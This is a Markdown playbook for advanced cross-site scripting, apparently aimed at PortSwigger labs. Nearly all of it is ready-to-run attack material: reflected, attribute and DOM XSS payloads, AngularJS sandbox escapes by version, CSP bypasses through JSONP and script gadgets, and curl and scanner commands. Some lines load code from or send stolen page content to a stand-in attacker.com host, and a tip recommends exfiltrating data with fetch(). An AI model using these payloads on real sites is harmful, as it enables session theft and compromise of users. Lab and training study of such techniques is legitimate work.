# Advanced XSS Methodology
## AngularJS Exploitation + CSP Bypass + DOM-Based XSS

> Expert-level playbook for complex XSS scenarios including framework-based 
> sandbox escapes and Content Security Policy bypass techniques.

---

## Phase 1: Reconnaissance & Context Analysis

### 1.1 Identify Reflection Points
```bash
# Inject a unique canary and observe where it reflects
curl -sk "http://target/search?q=xss_canary_12345" | grep -i "xss_canary"

# Check all response contexts:
# - HTML body (between tags)
# - HTML attribute (inside tag attributes)
# - JavaScript string (inside <script> blocks)
# - URL context (href/src attributes)  
# - CSS context (style attributes)
# - JSON response body
```

### 1.2 Check Security Headers
```bash
# Examine CSP, X-Frame-Options, X-XSS-Protection
curl -skI "http://target/" | grep -iE "(content-security|x-frame|x-xss|x-content-type)"
```

### 1.3 Fingerprint Frameworks
```bash
# Check for AngularJS
curl -sk "http://target/" | grep -iE "(angular|ng-app|ng-controller|ng-bind)"

# Check AngularJS version
curl -sk "http://target/" | grep -oP 'angular[^"]*\.js[^"]*' 

# Check for React, Vue, etc.
curl -sk "http://target/" | grep -iE "(react|vue|__next)"
```

### 1.4 CSP Analysis
```bash
# Extract and analyze CSP header
curl -skI "http://target/" | grep -i "content-security-policy"

# Key CSP directives to analyze:
# script-src: What sources can load scripts?
# style-src: What sources for styles?
# default-src: Fallback for missing directives
# object-src: Plugin content (Flash, Java)
# base-uri: Controls <base> tag
# report-uri: Where violations are reported

# Online CSP evaluator: https://csp-evaluator.withgoogle.com/
```

---

## Phase 2: Basic XSS Payloads

### 2.1 Reflected XSS
```html
<!-- Standard -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

<!-- Event-based -->
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<select onfocus=alert(1) autofocus>

<!-- Without parentheses -->
<img src=x onerror=alert`1`>
<svg onload=alert&lpar;1&rpar;>

<!-- Without alert keyword -->
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
<img src=x onerror=print()>
```

### 2.2 Attribute Context Escape
```html
<!-- Breaking out of attribute -->
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
' onmouseover='alert(1)

<!-- Breaking out with event handler -->
"><img src=x onerror=alert(1)>
'><svg onload=alert(1)>
```

### 2.3 JavaScript Context Escape
```javascript
// In a JS string context
';alert(1)//
\';alert(1)//
</script><script>alert(1)</script>
```

---

## Phase 3: AngularJS Sandbox Escape (Critical for PortSwigger)

### 3.1 AngularJS Template Injection
```
<!-- AngularJS evaluates expressions inside {{ }} -->
{{7*7}}
{{constructor.constructor('alert(1)')()}}
```

### 3.2 Version-Specific Sandbox Escapes

#### AngularJS 1.0.x - 1.1.x (no sandbox)
```
{{constructor.constructor('alert(1)')()}}
```

#### AngularJS 1.2.x
```
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
```

#### AngularJS 1.3.x
```
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a]'.constructor.prototype.charAt=[].join;$eval('x]',{x:'alert(1)//'})+''}}
```

#### AngularJS 1.4.x - 1.5.x
```
{{'a]'.constructor.prototype.charAt=[].join;$eval('x]alert(1)//');}}
```

#### AngularJS 1.5.0 - 1.5.8
```
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x]alert(1)//');}}
```

#### AngularJS 1.6.x+ (sandbox removed — direct execution)
```
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
```

### 3.3 AngularJS with CSP — Event-Based Attacks
When CSP blocks inline scripts, use AngularJS event directives:
```html
<!-- ng-focus with autofocus -->
<input ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'" autofocus>

<!-- ng-click (requires user interaction) -->
<div ng-click="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'">Click me</div>

<!-- ng-mouseover -->
<div ng-mouseover="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'">Hover</div>

<!-- Using $event.view.alert -->
<input ng-focus="$event.view.alert(1)" autofocus>

<!-- Using orderBy filter for code execution -->
<div ng-app>{{[].constructor.constructor('alert(1)')()}}</div>
```

### 3.4 AngularJS + Strict CSP Bypass (PortSwigger Expert Lab Pattern)
```html
<!-- When script-src is strict but angular.js is allowed -->
<!-- Inject into page with ng-app directive -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.x/angular.min.js"></script>

<!-- Then use template injection -->
{{$on.constructor('alert(document.cookie)')()}}

<!-- With CSP that allows 'unsafe-eval' for AngularJS -->
<input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'">
```

---

## Phase 4: CSP Bypass Techniques

### 4.1 Common CSP Weaknesses
```
# 'unsafe-inline' — allows inline scripts
script-src 'unsafe-inline'  → <script>alert(1)</script>

# 'unsafe-eval' — allows eval(), new Function(), etc.
script-src 'unsafe-eval'  → <img src=x onerror="eval('alert(1)')">

# Wildcard in path
script-src https://cdn.example.com/  → host a malicious JS file there

# Missing object-src 
→ <object data="data:text/html,<script>alert(1)</script>">

# Missing base-uri
→ <base href="https://attacker.com/"> (hijack relative script loads)

# data: URI allowed
script-src data:  → <script src="data:text/javascript,alert(1)"></script>

# blob: URI allowed
script-src blob:  → fetch data: URI, create blob, execute
```

### 4.2 JSONP CSP Bypass
```html
<!-- If CSP allows a JSONP endpoint's domain -->
<script src="https://allowed-cdn.com/jsonp?callback=alert(1)//"></script>

<!-- Common JSONP endpoints on CDNs -->
<!-- accounts.google.com/o/oauth2/revoke?callback=alert(1) -->
```

### 4.3 Script Gadgets (Framework-Based Bypass)
```html
<!-- If RequireJS is loaded -->
<div data-main="//attacker.com/evil"></div>

<!-- If jQuery is loaded -->
<div id="x" data-text="<script>alert(1)</script>"></div>
<script>$('#x').html($('#x').data('text'))</script>

<!-- If AngularJS is loaded (most relevant) -->
<!-- See Phase 3 above -->
```

### 4.4 Dangling Markup Injection (when script execution is blocked)
```html
<!-- Steal content after injection point -->
<img src="http://attacker.com/?stolen=
<!-- Content after this tag is sent as part of the img request -->
```

---

## Phase 5: DOM-Based XSS

### 5.1 Common DOM XSS Sources
```javascript
// URL-based sources
document.location
document.URL
document.documentURI
document.referrer
location.href
location.search
location.hash
window.name

// Storage sources
localStorage.getItem()
sessionStorage.getItem()
document.cookie

// Message sources
window.onmessage / addEventListener('message')
```

### 5.2 Common DOM XSS Sinks
```javascript
// Direct execution
eval()
setTimeout()
setInterval()
new Function()

// HTML injection
element.innerHTML
element.outerHTML
document.write()
document.writeln()

// Navigation
location.href = 
location.assign()
location.replace()
```

### 5.3 DOM XSS Testing
```
# Hash-based DOM XSS
http://target/page#<img src=x onerror=alert(1)>

# PostMessage-based
<iframe src="http://target" onload="this.contentWindow.postMessage('<img src=x onerror=alert(1)>','*')">
```

---

## Tools

### Manual curl-based testing
```bash
# Inject and check reflection
curl -sk "http://target/search?q=%3Cscript%3Ealert(1)%3C/script%3E" -b cookies.txt -c cookies.txt | grep -i "alert"

# Check response headers
curl -skI "http://target/" | head -20

# POST-based XSS
curl -sk "http://target/comment" -d "comment=<img src=x onerror=alert(1)>" -b cookies.txt
```

### Automated scanning
```bash
# XSStrike
python3 /opt/hackingtool/XSStrike/xsstrike.py -u "http://target/search?q=test"

# Dalfox
go install github.com/hahwul/dalfox/v2@latest
dalfox url "http://target/search?q=test"
```

---

## Common Failure Modes

| Problem | Solution |
|---------|----------|
| WAF blocks `<script>` | Use event handlers: `<img onerror=>`, `<svg onload=>` |
| Angle brackets encoded | Try attribute context escape: `" onmouseover="alert(1)` |
| CSP blocks inline scripts | Use AngularJS gadgets, JSONP, or CDN-hosted payloads |
| Framework sanitizes input | Look for bypass in specific framework version |
| Double encoding applied | Try encoding payloads: `%253Cscript%253E` |
| HttpOnly cookie | Use `fetch()` to exfiltrate data instead of `document.cookie` |
| Payload too long for field | Use external script: `<script src=//attacker.com/x.js>` |

## Success Criteria
- [ ] Identified the XSS type (reflected, stored, DOM-based)
- [ ] Determined encoding/filtering applied
- [ ] Analyzed CSP policy (if any)
- [ ] Identified framework (AngularJS version if present)
- [ ] Successfully executed alert/print/proof function
- [ ] Lab marked as solved
- [ ] Payload saved to /data/loot/
